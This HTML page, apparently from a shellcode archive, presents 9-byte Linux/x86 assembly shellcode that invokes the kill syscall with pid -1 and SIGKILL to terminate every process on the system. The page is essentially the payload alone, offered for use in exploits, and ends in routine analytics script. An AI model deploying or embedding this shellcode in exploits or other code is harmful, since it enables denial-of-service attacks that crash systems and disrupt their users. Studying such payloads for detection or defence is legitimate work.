<html><head><title>Linux/x86 - kill all processes - 9 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; linux/x86 kill all processes 9 bytes
; root@thegibson
; 2010-01-14
 
section .text
        global _start
 
_start:
        ; kill(-1, SIGKILL);
        mov al, 37
        push byte -1
        pop ebx
        mov cl, 9
        int 0x80

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
